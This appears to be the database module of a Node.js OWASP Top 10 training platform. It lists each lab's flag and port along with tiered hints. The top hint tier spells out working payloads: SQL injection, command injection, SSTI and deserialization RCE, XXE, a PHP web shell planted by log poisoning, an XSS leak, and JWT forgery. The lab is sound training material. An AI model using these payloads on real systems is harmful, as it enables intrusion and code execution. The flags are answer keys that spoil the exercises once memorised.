const fs = require('fs');
const path = require('path');

const DB_PATH = path.join(__dirname, 'data', 'db.json');

// Ensure data directory exists
if (!fs.existsSync(path.dirname(DB_PATH))) {
  fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
}

// Initial default state
const DEFAULT_STATE = {
  user: {
    username: "Guest Researcher",
    solvedCount: 0
  },
  labs: {
    "a01-idor": { id: "a01-idor", name: "Insecure Direct Object References (IDOR)", category: "A01:2021-Broken Access Control", difficulty: "Easy", solved: false, active: false, flag: "FLAG{idor_direct_access_success}", containerName: "lab_a01_idor", port: 30001 },
    "a01-privesc": { id: "a01-privesc", name: "Vertical & Horizontal Privilege Escalation", category: "A01:2021-Broken Access Control", difficulty: "Medium", solved: false, active: false, flag: "FLAG{jwt_privilege_escalation_admin}", containerName: "lab_a01_privesc", port: 30002 },
    "a01-path-traversal": { id: "a01-path-traversal", name: "Path Traversal (LFI)", category: "A01:2021-Broken Access Control", difficulty: "Easy", solved: false, active: false, flag: "FLAG{local_file_inclusion_secret}", containerName: "lab_a01_path_traversal", port: 30003 },
    
    "a02-weak-crypto": { id: "a02-weak-crypto", name: "Weak Cryptography & Token Decryption", category: "A02:2021-Cryptographic Failures", difficulty: "Medium", solved: false, active: false, flag: "FLAG{broken_cryptography_cracked}", containerName: "lab_a02_weak_crypto", port: 30004 },
    
    "a03-sqli-union": { id: "a03-sqli-union", name: "Union-Based SQL Injection", category: "A03:2021-Injection", difficulty: "Easy", solved: false, active: false, flag: "FLAG{sqli_union_data_extracted}", containerName: "lab_a03_sqli_union", port: 30005 },
    "a03-sqli-blind": { id: "a03-sqli-blind", name: "Blind SQL Injection (Boolean/Time)", category: "A03:2021-Injection", difficulty: "Medium", solved: false, active: false, flag: "FLAG{blind_sqli_exfiltrated}", containerName: "lab_a03_sqli_blind", port: 30006 },
    "a03-cmd-injection": { id: "a03-cmd-injection", name: "OS Command Injection", category: "A03:2021-Injection", difficulty: "Hard", solved: false, active: false, flag: "FLAG{command_injection_rce_shell}", containerName: "lab_a03_cmd_injection", port: 30007 },
    "a03-ssti": { id: "a03-ssti", name: "Server-Side Template Injection (SSTI)", category: "A03:2021-Injection", difficulty: "Hard", solved: false, active: false, flag: "FLAG{ssti_template_rce_done}", containerName: "lab_a03_ssti", port: 30008 },
    
    "a04-insecure-design": { id: "a04-insecure-design", name: "Broken Password Reset Flow", category: "A04:2021-Insecure Design", difficulty: "Easy", solved: false, active: false, flag: "FLAG{broken_reset_flow_hijacked}", containerName: "lab_a04_insecure_design", port: 30009 },
    
    "a05-xxe": { id: "a05-xxe", name: "XML External Entity (XXE) Injection", category: "A05:2021-Security Misconfiguration", difficulty: "Medium", solved: false, active: false, flag: "FLAG{xxe_external_entity_leak}", containerName: "lab_a05_xxe", port: 30010 },
    
    "a06-outdated-components": { id: "a06-outdated-components", name: "Vulnerable & Outdated Components (CVE)", category: "A06:2021-Vulnerable and Outdated Components", difficulty: "Hard", solved: false, active: false, flag: "FLAG{vulnerable_dependency_cve_rce}", containerName: "lab_a06_outdated_components", port: 30012 },
    
    "a07-jwt-bypass": { id: "a07-jwt-bypass", name: "JWT Signature Bypass (None Algorithm)", category: "A07:2021-Identification and Authentication Failures", difficulty: "Easy", solved: false, active: false, flag: "FLAG{jwt_none_signature_bypass}", containerName: "lab_a07_jwt_bypass", port: 30013 },
    
    "a08-deserialization-python": { id: "a08-deserialization-python", name: "Insecure Deserialization (Python Pickle)", category: "A08:2021-Software and Data Integrity Failures", difficulty: "Hard", solved: false, active: false, flag: "FLAG{pickle_deserialization_rce}", containerName: "lab_a08_deserialization_python", port: 30014 },
    
    "a09-log-injection": { id: "a09-log-injection", name: "Log Injection & Log Poisoning", category: "A09:2021-Security Logging and Monitoring Failures", difficulty: "Hard", solved: false, active: false, flag: "FLAG{log_poisoning_rce_shell}", containerName: "lab_a09_log_injection", port: 30015 },
    
    "a10-ssrf": { id: "a10-ssrf", name: "Server-Side Request Forgery (SSRF)", category: "A10:2021-Server-Side Request Forgery (SSRF)", difficulty: "Easy", solved: false, active: false, flag: "FLAG{ssrf_internal_metadata_leak}", containerName: "lab_a10_ssrf", port: 30016 },
    
    "a01-cors": { id: "a01-cors", name: "CORS Misconfiguration with Credentials", category: "A01:2021-Broken Access Control", difficulty: "Easy", solved: false, active: false, flag: "FLAG{cors_origin_credential_leak}", containerName: "lab_a01_cors", port: 30017 },
    "a03-sqli-time": { id: "a03-sqli-time", name: "Time-Blind SQL Injection", category: "A03:2021-Injection", difficulty: "Hard", solved: false, active: false, flag: "FLAG{time_sqli_exfiltrated}", containerName: "lab_a03_sqli_time", port: 30018 },
    "a05-git": { id: "a05-git", name: "Exposed Git Repository & Info Disclosure", category: "A05:2021-Security Misconfiguration", difficulty: "Easy", solved: false, active: false, flag: "FLAG{git_repo_secrets_dumped}", containerName: "lab_a05_git", port: 30019 },
    "a07-oauth": { id: "a07-oauth", name: "Broken OAuth 2.0 Flow (Account Takeover)", category: "A07:2021-Identification and Authentication Failures", difficulty: "Hard", solved: false, active: false, flag: "FLAG{oauth_redirect_uri_hijack}", containerName: "lab_a07_oauth", port: 30020 },
    "a10-ssrf-bypass": { id: "a10-ssrf-bypass", name: "SSRF with DNS & Blacklist Bypass", category: "A10:2021-Server-Side Request Forgery (SSRF)", difficulty: "Medium", solved: false, active: false, flag: "FLAG{ssrf_blacklist_bypass_secret}", containerName: "lab_a10_ssrf_bypass", port: 30021 },
    "a07-brute-force": { id: "a07-brute-force", name: "Username Enumeration & Password Brute Force", category: "A07:2021-Identification and Authentication Failures", difficulty: "Easy", solved: false, active: false, flag: "FLAG{verbose_errors_enable_brute_force}", containerName: "lab_a07_brute_force", port: 30022 },
    "a08-node-serialize": { id: "a08-node-serialize", name: "Insecure Deserialization (Node serialize)", category: "A08:2021-Software and Data Integrity Failures", difficulty: "Hard", solved: false, active: false, flag: "FLAG{node_serialize_rce_shell}", containerName: "lab_a08_node_serialize", port: 30023 },
    "a09-log-xss": { id: "a09-log-xss", name: "Stored XSS via Connection Log Poisoning", category: "A09:2021-Security Logging and Monitoring Failures", difficulty: "Medium", solved: false, active: false, flag: "FLAG{log_poisoning_stored_xss}", containerName: "lab_a09_log_xss", port: 30024 },
    "a03-nosql": { id: "a03-nosql", name: "NoSQL Operator Injection (MongoDB/NeDB)", category: "A03:2021-Injection", difficulty: "Easy", solved: false, active: false, flag: "FLAG{nosql_operator_injection_bypass}", containerName: "lab_a03_nosql", port: 30025 },
    "a03-ldap": { id: "a03-ldap", name: "LDAP Filter Wildcard Search Bypass", category: "A03:2021-Injection", difficulty: "Medium", solved: false, active: false, flag: "FLAG{ldap_filter_wildcard_leak}", containerName: "lab_a03_ldap", port: 30026 },
    "a03-second-order": { id: "a03-second-order", name: "Second-Order SQL Injection", category: "A03:2021-Injection", difficulty: "Hard", solved: false, active: false, flag: "FLAG{second_order_sqli_takeover}", containerName: "lab_a03_second_order", port: 30027 },
    "a03-xpath": { id: "a03-xpath", name: "XPath Injection XML Data Disclosure", category: "A03:2021-Injection", difficulty: "Medium", solved: false, active: false, flag: "FLAG{xpath_xml_traversal_success}", containerName: "lab_a03_xpath", port: 30028 },
    "a03-argument-injection": { id: "a03-argument-injection", name: "Parameter & Argument Injection RCE", category: "A03:2021-Injection", difficulty: "Hard", solved: false, active: false, flag: "FLAG{argument_injection_rce_parameter}", containerName: "lab_a03_argument_injection", port: 30029 },
    "a08-prototype-pollution": { id: "a08-prototype-pollution", name: "Server-Side Prototype Pollution", category: "A08:2021-Software and Data Integrity Failures", difficulty: "Hard", solved: false, active: false, flag: "FLAG{prototype_pollution_global_pollution}", containerName: "lab_a08_prototype_pollution", port: 30030 },
    "a02-jwt-confusion": { id: "a02-jwt-confusion", name: "JWT Key Confusion Attack (HMAC vs RSA)", category: "A02:2021-Cryptographic Failures", difficulty: "Hard", solved: false, active: false, flag: "FLAG{jwt_key_confusion_signature_bypass}", containerName: "lab_a02_jwt_confusion", port: 30031 },
    "a06-request-smuggling": { id: "a06-request-smuggling", name: "HTTP Request Smuggling (CL.TE Mismatch)", category: "A06:2021-Vulnerable and Outdated Components", difficulty: "Expert", solved: false, active: false, flag: "FLAG{request_smuggling_cl_te_poisoning}", containerName: "lab_a06_request_smuggling", port: 30032 },
    "a04-race-condition": { id: "a04-race-condition", name: "Concurrency Race Condition (Limit Overrun)", category: "A04:2021-Insecure Design", difficulty: "Medium", solved: false, active: false, flag: "FLAG{race_condition_concurrency_bypass}", containerName: "lab_a04_race_condition", port: 30033 },
    "cybercorp-portal": { id: "cybercorp-portal", name: "OWASP Flagship - CyberCorp Audit Portal", category: "A00:2021-Multi-Stage Flagship Scenario", difficulty: "Expert", solved: false, active: false, flag: "FLAG{cybercorp_multi_stage_flagship_rce}", containerName: "lab_cybercorp_portal", port: 30040 }
  }
};

function readDb() {
  try {
    if (!fs.existsSync(DB_PATH)) {
      writeDb(DEFAULT_STATE);
      return DEFAULT_STATE;
    }
    const rawData = fs.readFileSync(DB_PATH, 'utf8');
    const parsed = JSON.parse(rawData);
    
    // Dynamic synchronization: Merge any missing labs from DEFAULT_STATE into active db state,
    // and sync existing labs metadata (like name, category, difficulty, port, containerName) from DEFAULT_STATE.
    let updated = false;
    for (const key in DEFAULT_STATE.labs) {
      if (!parsed.labs[key]) {
        parsed.labs[key] = DEFAULT_STATE.labs[key];
        updated = true;
      } else {
        // Sync metadata fields to ensure difficulty updates are propagated
        const fieldsToSync = ['name', 'category', 'difficulty', 'port', 'containerName'];
        for (const field of fieldsToSync) {
          if (parsed.labs[key][field] !== DEFAULT_STATE.labs[key][field]) {
            parsed.labs[key][field] = DEFAULT_STATE.labs[key][field];
            updated = true;
          }
        }
      }
    }
    if (updated) {
      writeDb(parsed);
    }
    return parsed;
  } catch (error) {
    console.error("Error reading database file, resetting to default...", error);
    writeDb(DEFAULT_STATE);
    return DEFAULT_STATE;
  }
}

function writeDb(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), 'utf8');
  } catch (error) {
    console.error("Error writing to database file:", error);
  }
}

const db = {
  getLabs: () => {
    const data = readDb();
    return Object.values(data.labs);
  },

  getLab: (id) => {
    const data = readDb();
    return data.labs[id] || null;
  },

  updateLab: (id, updates) => {
    const data = readDb();
    if (data.labs[id]) {
      data.labs[id] = { ...data.labs[id], ...updates };
      
      // Update solved count
      const solvedCount = Object.values(data.labs).filter(l => l.solved).length;
      data.user.solvedCount = solvedCount;
      
      writeDb(data);
      return data.labs[id];
    }
    return null;
  },

  resetProgress: () => {
    writeDb(DEFAULT_STATE);
    return DEFAULT_STATE;
  },

  getHints: (id) => {
    const HINTS_CATALOG = {
      "a01-idor": {
        tier1: "RECON: Look closely at the URL query string parameter `id` when accessing your order invoices.",
        tier2: "VECTOR: The endpoint retrieves order data directly by ID without verifying if the current session owns it. Try horizontal privilege escalation by changing the identifier.",
        tier3: "EXPLOIT: Query the endpoint at: http://localhost:30001/api/order?id=3 to retrieve the administrator's shipping address containing the flag."
      },
      "a01-path-traversal": {
        tier1: "RECON: Analyze the `/api/view` endpoint and its `file` parameter used for reading company PDFs.",
        tier2: "VECTOR: The server appends your file query straight into a local directory path. Use directory traversal delimiters (`../`) to escape the restricted folder and traverse to the root.",
        tier3: "EXPLOIT: Fetch the flag file directly using path traversal: http://localhost:30003/api/view?file=../../flag.txt"
      },
      "a01-privesc": {
        tier1: "RECON: Inspect the browser storage and request headers. Note the `auth_token` cookie value.",
        tier2: "VECTOR: The token is a JSON Web Token (JWT). Base64-decode the header and payload. The server decodes but does not validate the cryptographic signature, allowing you to hijack roles.",
        tier3: "EXPLOIT: Decrypt the cookie payload, change `'role': 'guest'` to `'role': 'admin'`, base64-encode it back, keep the signature part empty (trailing dot intact), and resubmit."
      },
      "a02-weak-crypto": {
        tier1: "RECON: Use the `/api/source` endpoint to download the server implementation code and analyze cookie encryption.",
        tier2: "VECTOR: Cookies are encrypted using AES-128-ECB with a hardcoded key `s3cr3t_k3y_128_b`. Use this key to encrypt a modified admin payload.",
        tier3: "EXPLOIT: Encrypt the JSON structure `{\"username\":\"admin\",\"role\":\"admin\",\"created\":1716800000000}` with the key using AES-128-ECB, hex-encode it, and submit as the `session` cookie."
      },
      "a03-sqli-union": {
        tier1: "RECON: Test the product search query parameter by injecting single quotes (`'`) to check for SQL syntax errors.",
        tier2: "VECTOR: Queries are directly interpolated. Determine column counts, then run a UNION SELECT payload targeting the internal `users` database table.",
        tier3: "EXPLOIT: Input the SQL injection payload: `' UNION SELECT username, password, '3' FROM users --` to dump the admin flag."
      },
      "a03-sqli-blind": {
        tier1: "RECON: Audit the cookie headers. The `TrackingId` cookie triggers visitor database lookups.",
        tier2: "VECTOR: The page displays a generic welcome text if the query returns rows. Exploit boolean blind SQL injection using conditional checks and character slicing `SUBSTR`.",
        tier3: "EXPLOIT: Inject character brute-forcing statements: `visitor_id_x99' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='F` to extract the password flag char-by-char."
      },
      "a03-cmd-injection": {
        tier1: "RECON: Test the diagnostics ping panel. Try appending typical command chain operators like `;` or `|`.",
        tier2: "VECTOR: The backend runs inputs via a shell environment. The WAF blocks spaces and the word 'flag'. Bypass space filters using `$IFS` and keyword filters using wildcard operators (`*`).",
        tier3: "EXPLOIT: Enter: `127.0.0.1;cat$IFS*.txt` in the input field to trigger RCE and retrieve the flag."
      },
      "a03-ssti": {
        tier1: "RECON: Test the template rendering design panel by submitting evaluation brackets like `{{ 7*7 }}`.",
        tier2: "VECTOR: The server uses Jinja2 template rendering. Traverse Python object hierarchies (`__mro__` or `__globals__`) to access the `os` process module.",
        tier3: "EXPLOIT: Render the flag file via python RCE: `{{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}`"
      },
      "a04-insecure-design": {
        tier1: "RECON: Map out the forgotten password workflow. Trigger a reset code for the `guest` user.",
        tier2: "VECTOR: The reset verification state is checked in the session. However, the final update password endpoint takes whatever `username` is passed in the POST body without validating matching state.",
        tier3: "EXPLOIT: Verify the code for your `guest` account, then intercept the final password update request and replace `guest` with `admin` in the body payload."
      },
      "a05-xxe": {
        tier1: "RECON: Inspect how support tickets are processed. They accept raw XML bodies.",
        tier2: "VECTOR: The XML parser evaluates external entities. Declare a custom external entity pointing to the target local file `file:///app/flag.txt`.",
        tier3: "EXPLOIT: Submit: `<?xml version=\"1.0\"?><!DOCTYPE t [ <!ENTITY x SYSTEM \"file:///app/flag.txt\"> ]><contact><name>&x;</name><email>t@corp.local</email><message>t</message></contact>`"
      },
      "a06-outdated-components": {
        tier1: "RECON: Investigate the framework and templating components. The application runs on EJS v3.1.6.",
        tier2: "VECTOR: Audit CVE-2022-29078. You can pollute render options via settings query parameters, overwriting dynamic escape functions to trigger shell commands.",
        tier3: "EXPLOIT: URL payload: `/?settings[view options][client]=true&settings[view options][escapeFunction]=1;global.process.mainModule.require('child_process').execSync('cat flag.txt > public/flag.txt');//`"
      },
      "a07-jwt-bypass": {
        tier1: "RECON: Decrypt the `auth_token` JWT cookie. Look at the signature alg parameter in the header.",
        tier2: "VECTOR: The verification engine permits the insecure `none` algorithm. Change the header alg to `none`, elevate your role payload to `admin`, and clear the signature.",
        tier3: "EXPLOIT: Generate a token using `{\"alg\":\"none\",\"typ\":\"JWT\"}` and `{\"username\":\"admin\",\"role\":\"admin\"}`. Remove signature characters, keeping the trailing dot: `HEADER.PAYLOAD.`"
      },
      "a08-deserialization-python": {
        tier1: "RECON: Inspect the cookie parameters. The `session` cookie stores base64-encoded binary payload data.",
        tier2: "VECTOR: The binary stream represents a serialized Python Pickle object. Leverage Pickle's `__reduce__` method to execute commands when unserialized.",
        tier3: "EXPLOIT: Serialize a class in Python with `__reduce__` returning `(os.system, ('cp flag.txt static/flag.txt',))`, base64 encode it, and pass as the session cookie."
      },
      "a09-log-injection": {
        tier1: "RECON: Audit the gateway connection headers. Note that the monitoring app logs connection User-Agents.",
        tier2: "VECTOR: The application has a local file inclusion vulnerability (`?file=`) and stores logs in `logs/access.log`. Inject PHP execution code into the logs, then execute it via LFI.",
        tier3: "EXPLOIT: Query root with `User-Agent: <?php system($_GET['cmd']); ?>`, then trigger RCE via LFI: `/index.php?file=logs/access.log&cmd=cat /app/flag.txt`"
      },
      "a10-ssrf": {
        tier1: "RECON: Test the content proxies url retriever `/api/fetch?url=...` with external endpoints.",
        tier2: "VECTOR: The server fetches URLs locally. Query the administrative loopback page `/admin/secret` (which blocks public calls but trusts internal requests).",
        tier3: "EXPLOIT: Fetch: `/api/fetch?url=http://127.0.0.1:3000/admin/secret` to bypass the firewall and capture the flag."
      },
      "a01-cors": {
        tier1: "RECON: Look at the CORS response headers. Check if the server reflects the Origin value dynamically.",
        tier2: "VECTOR: The API dynamically mirrors custom Origin headers and permits credentials. Build an exploit script to query the sensitive profile and leak credentials.",
        tier3: "EXPLOIT: Deploy a third-party script fetching `http://localhost:30017/api/sensitive-profile` with credentials enabled, mirroring Origin to hijack session flags."
      },
      "a03-sqli-time": {
        tier1: "RECON: Test query response latencies. Inject timing side-channel parameters inside the `TrackingId` cookie.",
        tier2: "VECTOR: Blind SQLi timing bypass. Force a heavy Cartesian product `CROSS JOIN` on the 600-row `delay_helper` table if conditional characters match.",
        tier3: "EXPLOIT: Inject: `visitor_id_x99' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='F') THEN (SELECT COUNT(*) FROM delay_helper t1 CROSS JOIN delay_helper t2 CROSS JOIN delay_helper t3) ELSE 0 END) = 0 --`"
      },
      "a05-git": {
        tier1: "RECON: Audit the server file directories for hidden structures. The `.git` repository folder is exposed.",
        tier2: "VECTOR: Search the `.git` loose objects and logs to reconstruct deleted files. Fetch `/.git/logs/HEAD` to find early commits.",
        tier3: "EXPLOIT: Find the 'Add flag' commit in history logs, resolve its tree object hash, extract the SHA-1 of the deleted `flag.txt` blob, and decompress the zlib file."
      },
      "a07-oauth": {
        tier1: "RECON: Audit the OAuth client registration. Inspect how redirection URIs are validated.",
        tier2: "VECTOR: The auth server validates callback redirect prefixes weakly. Exploit redirect hijacking by passing path traversal sequences (`/oauth/callback/../../api/attacker-receiver`).",
        tier3: "EXPLOIT: Pass the malicious URL to `/api/trigger-login` to capture the admin auth code at your receiver, exchange it for a session, and query `/api/admin/flag`."
      },
      "a10-ssrf-bypass": {
        tier1: "RECON: Try to query internal port 8000 via `/fetch?url=...` and audit firewall blacklists.",
        tier2: "VECTOR: The firewall blocks literal IPs (`127.0.0.1`, `localhost`). Bypass filters using decimal integer IP obfuscation (`2130706433`) or octal representations.",
        tier3: "EXPLOIT: Submit: `/fetch?url=http://2130706433:8000/flag` to query the administrative flag directly."
      },
      "a07-brute-force": {
        tier1: "RECON: Test the `/api/login` endpoint with custom payloads to audit validation error feedback.",
        tier2: "VECTOR: The login routine reveals whether the username exists (`Invalid username` vs `Incorrect password for user`). Map valid users first, then brute-force the passcode.",
        tier3: "EXPLOIT: Map `admin_sec_operator` via user enumeration, then brute-force the dictionary list to discover password `shadow123`."
      },
      "a08-node-serialize": {
        tier1: "RECON: Decode the base64-encoded `session` cookie. Note its framework serialization format.",
        tier2: "VECTOR: The app parses cookies using vulnerable `node-serialize`. Inject an IIFE function block using the `_$$ND_FUNC$$_` key to trigger server RCE.",
        tier3: "EXPLOIT: Pass a cookie containing: `{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('cp flag.txt public/flag.txt')}()\"}`"
      },
      "a09-log-xss": {
        tier1: "RECON: Audit log monitors. The application records access connection User-Agents in `/admin/logs`.",
        tier2: "VECTOR: The ledger displays logs raw without HTML-escaping. Inject a cross-site scripting payload inside the User-Agent header, then trigger the admin log view bot.",
        tier3: "EXPLOIT: Submit a request with `User-Agent: <script>fetch('/api/admin/flag').then(r=>r.json()).then(d=>fetch('/api/leak?flag='+d.flag))</script>`, and call `/api/trigger-admin-view`."
      },
      "a03-nosql": {
        tier1: "RECON: Audit the authentication login page. Note how POST requests are parsed directly without validation.",
        tier2: "VECTOR: The database engine (NeDB) parses JSON objects. Submit a JSON object with query operators (like `{\"$ne\": null}`) to force database lookups to match any non-matching conditions.",
        tier3: "EXPLOIT: Submit the login payload: `username[$ne]=admin_user&password[$ne]=incorrect_password` or query directly with JSON parameters via Mini-Burp Repeater."
      },
      "a03-ldap": {
        tier1: "RECON: The application queries a directory server. Inspect the search field where user groups are listed.",
        tier2: "VECTOR: Injected filters aren't sanitized. The filter wildcard character `*` matches any string. Leverage logical bounds `*)(|(&` to construct arbitrary logical search attributes.",
        tier3: "EXPLOIT: Query with search filters: `*)(flag=*` and brute-force individual characters using a timing/result logic loop to leak attributes."
      },
      "a03-second-order": {
        tier1: "RECON: Investigate user registration and profile view pages. You can register custom handles.",
        tier2: "VECTOR: The database sanitizes inputs on creation, but retrieves usernames and interpolates them raw inside secondary query workflows (like viewing profile stats or updating email).",
        tier3: "EXPLOIT: Register a username `admin' --`, log in, then view profile stats to trigger database-wide modifications."
      },
      "a03-xpath": {
        tier1: "RECON: Audit the XML lookup query interface. Test for XPath syntax errors by injecting quotes (`'`).",
        tier2: "VECTOR: Input is concatenated directly into `/catalog/product[name='INPUT']`. Navigate XML structures to access other siblings and hidden tags containing the flag.",
        tier3: "EXPLOIT: Injected search: `1' or true() or '` or `'] | //* | //*[name()='` to read the entire XML nodes schema."
      },
      "a03-argument-injection": {
        tier1: "RECON: Analyze parameters processed by backend commands (like image converter tools or file retrievers).",
        tier2: "VECTOR: Even if process inputs are parameterized, passing arguments starting with `-` or `--` alters execution flags. Abuse commands like `curl -o` or `wget -O` to read/write random files.",
        tier3: "EXPLOIT: In the URL parser parameter, inject: `--config` or use argument structures to override file outputs: `url=--output&url=public/flag.txt&url=http://localhost:30029/flag`."
      },
      "a08-prototype-pollution": {
        tier1: "RECON: Test the JSON config modification endpoint. Check if recursive merge properties are validated.",
        tier2: "VECTOR: Insecure deep clone or merge functions map attributes without preventing `__proto__` references. Pollute global attributes (like `isAdmin`) to gain administrative scope.",
        tier3: "EXPLOIT: Submit payload: `{\"__proto__\": {\"isAdmin\": true}}` via a PUT/POST request, then query the admin stats panel."
      },
      "a02-jwt-confusion": {
        tier1: "RECON: Download the server's public key from `/public-key.pem` and base64-decode your session token.",
        tier2: "VECTOR: The verification engine dynamically checks token algorithm header tags. Swap RS256 to HS256, and sign the token using the plain-text PEM public key string as the HMAC secret key.",
        tier3: "EXPLOIT: Sign a forged token containing `\"role\": \"admin\"` with HS256 using the extracted public key value."
      },
      "a06-request-smuggling": {
        tier1: "RECON: Query the proxy server using different headers. Probe how CL and TE mismatches are handled.",
        tier2: "VECTOR: Smuggle a chunked request payload by appending raw CRLF line bytes, hiding a nested request in the pipeline.",
        tier3: "EXPLOIT: Send an HTTP pipeline request with mismatching CL and TE parameters containing nested endpoints."
      },
      "a04-race-condition": {
        tier1: "RECON: Test coupon redemption speed. Observe if coupon application logs a delay.",
        tier2: "VECTOR: Multi-endpoint TOCTOU timing gap. Execute parallel asynchronous HTTP POST requests inside a narrow microsecond timing window to bypass lock checks.",
        tier3: "EXPLOIT: Send 10 parallel coupon redemption requests concurrently using Promise.all or thread batches."
      },
      "cybercorp-portal": {
        tier1: "RECON: Scan announcements to leak reference hashes. Probe the SQL catalog using UNION statements.",
        tier2: "VECTOR: Exploit BOLA/IDOR by fetching across tenants using the leaked hash. Take the private key PEM and forge a JWT session utilizing algorithm confusion (HS256 using RSA Public Key).",
        tier3: "EXPLOIT: Leverage Prototype Pollution via configuration merge settings to pollute Object.prototype. Trigger EJS template RCE and execute system shell to read '/app/flag.txt'."
      }
    };
    return HINTS_CATALOG[id] || null;
  }
};

module.exports = db;
